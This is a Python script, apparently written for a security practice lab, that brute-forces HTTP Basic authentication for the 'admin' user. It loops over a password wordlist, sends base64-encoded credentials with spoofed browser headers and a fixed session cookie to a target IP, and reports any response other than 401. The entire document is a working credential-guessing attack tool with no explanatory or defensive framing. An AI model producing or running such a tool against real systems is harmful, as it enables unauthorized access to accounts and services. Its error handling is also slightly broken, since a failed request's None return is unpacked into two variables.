import requests
import sys
import base64

def send_authentication_value(payload_authentication, ip_target):
    url = f"http://{ip_target}/labs/basic_auth/"
    http_header = {
      "Host": f"{ip_target}",
      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      'Accept-Language': "en-US,en;q=0.5",
      'Accept-Encoding': 'gzip, deflate',
      'Connection': 'keep-alive',
      'Referer': f'http://{ip_target}/',
      'Cookie': 'PHPSESSID=gdn95vrtvjckfssbjcqioqfep0',
      'Upgrade-Insecure-Requests': '1',
      'Priority': 'u=0, i',
      'Authorization': f'Basic {payload_authentication}'
    }
    try:
       response = requests.get(url, headers=http_header, timeout=5)
       return (response.text, response)
    except requests.exceptions.RequestException as error:
           print(error)
           return None

def enumerate_passwords(passwords_wordlist, ip_target):
    try:
       with open(passwords_wordlist, "r") as file:
            passwords = [line.strip() for line in file if line.strip()]
            for password in passwords:
                payload_authentication_text = f"admin:{password}"
                payload_authentication = base64.standard_b64encode(bytes(payload_authentication_text, "utf-8")).decode("utf-8")
                response_text, response = send_authentication_value(payload_authentication, ip_target)
                if response_text is None:
                   print(f"Error! Body is None );\nPayload: {payload_authentication}\nBody: {response_text}")
                   continue
                if response.status_code != 401:
                   print(f"[+] Success! {payload_authentication_text}\n{response.status_code}\n{response_text}")
                
    except Exception as error:
           print(f"Sorry, error ):\n{str(error)}")

if __name__ == "__main__":
   if len(sys.argv) < 3:
      print("Usage: Path <passwords_wordlist.txt> IP <000.000.000>")
      sys.exit(0)

   passwords_wordlist = sys.argv[1]
   ip_target = sys.argv[2]
   
   enumerate_passwords(passwords_wordlist, ip_target)

